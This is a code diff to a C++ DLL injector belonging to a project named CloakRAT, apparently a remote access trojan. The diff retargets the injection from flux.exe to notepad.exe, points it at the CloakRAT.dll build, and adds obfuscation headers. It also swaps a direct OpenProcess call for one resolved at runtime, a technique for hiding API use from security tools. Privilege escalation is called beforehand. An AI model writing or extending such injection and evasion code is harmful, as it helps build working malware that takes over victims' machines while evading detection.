@@ -1,14 +1,16 @@
 #include <iostream>
 #include <windows.h>
 #include "utils.h"
+#include "winapi_signatures.h"
+#include "winapi_obfuscation.h"
 
-#define DLL_PATH "C:\\Users\\tal78\\Desktop\\Workspace\\CloakRAT\\Release\\CloakRAT.dll"
-#define TARGET_EXE "flux.exe"
+#define DLL_PATH "C:\\Users\\tal78\\Desktop\\Workspace\\CloakRAT\\x64\\Release\\CloakRAT.dll"
+#define TARGET_EXE "notepad.exe"
 
 int main(int argc, char** argv)
 {
 	const char* dllPath = DLL_PATH;
-	const char* procName = argc == 0 ? TARGET_EXE : argv[1];
+	const char* procName = argc <= 1 ? TARGET_EXE : argv[1];
 
 	if (EscalatePrivilege() == -1)
 	{
@@ -23,7 +25,7 @@ int main(int argc, char** argv)
 		Sleep(100);
 	}
 
-	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procID);
+	HANDLE hProc = ((OpenProcess_t)resolve_func("kernel32.dll", "OpenProcess"))(PROCESS_ALL_ACCESS, 0, procID);
 
 	if (hProc && hProc != INVALID_HANDLE_VALUE) // if we got a handle successfully
 	{
